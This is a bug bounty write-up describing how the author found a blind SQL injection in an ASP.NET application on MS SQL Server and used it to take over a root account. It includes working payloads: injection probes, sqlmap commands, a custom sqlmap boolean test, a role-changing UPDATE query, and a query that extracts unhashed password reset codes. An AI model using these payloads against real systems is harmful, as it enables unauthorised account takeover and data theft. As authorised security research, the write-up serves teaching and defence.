# :game_die: Root user account takeover via SQL Injection

---

# Root user account takeover via SQL Injection

Recently, I discovered a few interesting SQL injections. I came across this while testing an [ASP.NET](http://asp.net/) application with an MS SQL Server database at the backend. This combination of technologies often produces a lot of interesting bugs. I don’t know if this is because of the complexity and lack of knowledge of the developer or the nature of these technologies. But perhaps both of them.

## Discovering

But before I start to dig into the discovered SQL injections, I would like to show the process of discovering these bugs because I think it’s quite simple and interesting.

So while testing an [ASP.NET](http://asp.net/) application, I came across a JS file with a list of available API endpoints. It has more than five hundred different routes. Most of them accept POST requests with JSON payload. The application validates only expected fields from JSON data and ignores all others. So you can pass as many parameters as you wish.

I opened my BurpSuite and started proxying all requests. I visited each page and clicked all the buttons which I found. Then I went to the GAP Butp extension and extracted a few hundred different parameters. Then I removed the noise and got like 150 unique parameter names.

Then I crafted this payload:

```
{
"DocumentType": "'",
"Filter": "'",
"OrderColumn": "'",
"OrderDirection": "'",
"Page": "'",
"PageSize": "'",
"SearchFilter": "'",
"access_token": "'",
"family": "'",
"file": "'",
"fileName": "'",
"filename": "'",
"id": "'",
"identityCode": "'",
"invariant": "'",
...
}
```

Using Burp Intruder I uploaded a list of all endpoints into the payloads section and started.

*A list of endpoints in Intruder*

I quite quickly found some interesting error messages, but my attention was caught by a classic error message.: `Incorrect syntax near ...`

## From Time-based SQL injection to Boolean

The vulnerable parameter was `orgId`. I quickly made some manual tests to prove the issue, like `' and 1/@@version=1--` and `'; waitfor delay '00:00:10';--.`

The first one gives me `An error occurred while reading from the store provider's data reader. See the inner exception for details.`, but the second one freezes the page for 10 seconds.

So I opened my terminal and typed a SQLmap command:

```
python3 sqlmap.py -r sql_request.http --batch --dbms=MSSQL --technique=T
```

And got this result:

```

Parameter: JSON orgId ((custom) POST)
Type: time-based blind
Title: Microsoft SQL Server/Sybase time-based blind (IF)
Payload: {
"orgId": "' WAITFOR DELAY '0:0:5'-- fTEg"
}

```

I cannot trigger an error with `' and 1/@@version --`, but I can turn the Time-based SQL injection into a boolean-based one. It can be done in the next way.

When we have an error, the next message appears:

```
An error occurred while reading from the store provider's data reader. See the inner exception for details.
```

But when everything is fine, we have:

```
Object reference not set to an instance of an object.
```

This totally looks like a Boolean-Based SQL Injection, but SQLmap is stuck with identification.

Thanks to the creator of SQLmap, it is so easy to implement a custom check test. This is my test:

```
<test>
<title>Microsoft SQL Server/Sybase custom boolean test</title>
<stype>1</stype>
<level>3</level>
<risk>1</risk>
<clause>1,3</clause>
<where>3</where>
<vector>' and (SELECT CASE WHEN ([INFERENCE]) then [RANDNUM] else [RANDNUM]/@@version end)=1--</vector>
<request>
<payload>' and (SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) then [RANDNUM] else [RANDNUM]/@@version end)=1--</payload>
</request>
<response>
<comparison>' and (SELECT CASE WHEN ([RANDNUM]=[RANDNUM1]) then [RANDNUM] else [RANDNUM]/@@version end)=1--</comparison>
</response>
<details>
<dbms>Microsoft SQL Server</dbms>
<dbms>Sybase</dbms>
</details>
</test>
```

As we know boolean-based injection requires two types of requests: one for true and one for false. In our case, when we have a false statement, we raise an exception by `[RANDNUM]/@@version`, and a true statement `[RANDNUM]` returns a different message. (where `[RANDNUM]` is a random number generated for each request).

## Get SW’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

First of all, SQLmap tries this expression:

```
<request>
<payload>' and (SELECT CASE WHEN ([RANDNUM]=[RANDNUM]) then [RANDNUM] else [RANDNUM]/@@version end)=1--</payload>
</request>
```

Which always returns true and raises: `Object reference not set to an instance of an object.`

Then it uses the next expression:

```
<response>
<comparison>' and (SELECT CASE WHEN ([RANDNUM]=[RANDNUM1]) then [RANDNUM] else [RANDNUM]/@@version end)=1--</comparison>
</response>
```

This raises a different error: `An error occurred while reading from the store provider's data reader....`

So based on this SQLmap can tell whether we have an SQL injection or not.

Finally, when we verify our injection we can use `vector` payload for executing any SQL statement:

```
<vector>' and (SELECT CASE WHEN ([INFERENCE]) then [RANDNUM] else [RANDNUM]/@@version end)=1--</vector>
```

You can see the `([INFERENCE])` placeholder which will be replaced with an SQL expression that will brute force each character in the response.

So at this point, we have a working Boolean-based SQL injection. So what can we do with this?

## SuperAdmin account via SQL injection

As you can see from the title, I would like to escalate my user account to a system admin, but I don’t know how.

I did some enumeration with my SQL injection. It shows that we have a database with more than 500 tables. In such a case, it would be hard to find something useful with blind injection. I decided to do some recon. While investigating a sub-domain of this org, I found a Swagger page that has a license file that points to this framework[aspnetboilerplate](https://github.com/aspnetboilerplate/aspnetboilerplate/tree/dev).

In this repo, I found what I am looking for. This is a list of User and Role and Permission tables and their relationships. With this info, we can try to escalate our privilege.

```
AbpUser
AbpUserRoles
AbpPermissions
AbpRoles
```

In one of the requests in BurpSuite, I found my `userId` and a list of roles to which I have access. First of all I tried to change my role to the admin one:

```
'; UPDATE AbpUserRoles SET RoleId = 1 WHERE UserId = 1;
```

But it does not work. I was really upset. SQL Server is vulnerable to stacked queries, and my `; waitfor delay('00:00:10')--` works as expected. However, insert and update fails. I don't know why, it looks like I need to set up a similar application to do an investigation, but let it be for next time.

So I went back to the source code and started to find other vulnerabilities. My attention was caught by the password reset functionality. When you request a password reset, the application sends you an email with a 150-character-long string, like this:

```
AQAAANCMnd8BFdERjHoAwEClsBAAAAG271F7ec5U2cXGSnXLVOwAAAAACAAAAAAADZgAAwAAABAAAAABvl3pDreFoK1CVKG5KrY2AAAAAASCEACgAAAAEAAAAETobwotlA8tQADRBwune3IAAAAFkM
```

The database column responsible for this field is [here](https://github.com/aspnetboilerplate/aspnetboilerplate/blob/b4f5d9ed956063252d682e1fdbbf0027f874ce44/src/Abp.Zero.Common/Authorization/Users/AbpUserBase.cs#L147). Further investigation shows that no hashing was applied to the password reset token, and at this point, I realize that I can read this field for any user.

I found the admin email and reset his password via the WEB application. Then I crafted this query:

```
python3 sqlmap.py -r sql_request.http --batch --dbms=MSSQL -D ApplicationDatabase -sql-query="SELECT TOP 1 name,EmailAddress,PasswordResetCode,id from ApplicationDatabase.AbpUsers order by id asc"
```

It takes 15 minutes to brute force all 150 characters, but it works, and I successfully get the root user account.

## Takeaways

For me, obtaining a root user account was a challenge. I set this goal for myself just to prove its feasibility. With a root user account, I can access other features and uncover more bugs.

However, my ultimate objective is to obtain the source code of the application.

All of these activities were conducted within a self-hosted Bug Bounty program, in a staged environment, so please exercise responsibility when conducting your tests.

---
